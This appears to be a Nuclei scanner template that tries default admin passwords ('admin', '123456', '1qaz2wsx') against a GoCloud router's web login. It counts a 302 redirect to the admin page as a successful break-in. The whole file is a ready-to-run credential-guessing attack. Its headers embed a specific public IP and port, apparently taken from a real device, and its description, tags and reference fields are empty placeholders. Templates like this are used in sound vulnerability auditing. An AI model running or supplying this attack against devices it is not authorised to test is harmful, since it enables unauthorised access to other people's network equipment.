id: gocloud-default-login
info:
  name: gocloud-default-login
  author: apple
  severity: high
  description: description
  reference:
    - https://
  tags: tags
http:
  - raw:
      - |-
        POST /cgi-bin/webui/admin HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
        Accept: application/json
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Referer: http://180.118.241.247:8088/cgi-bin/webui/admin
        Content-Type: application/x-www-form-urlencoded; charset=utf-8
        Content-Length: 128
        Origin: http://180.118.241.247:8088
        Connection: close

        userName={{username}}&password={{password}}&timestamp=1705935750&csrftoken=MTcwNTkzNTc1MEdPQ0xPVUQ%3D&newwebui=yes&username=admin&type=account

    attack: clusterbomb
    payloads:
      username:
        - admin
      password:
        - admin
        - 123456
        - 1qaz2wsx
        
    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - /cgi-bin/webui/admin
      - type: word
        part: header
        words:
          - '302'
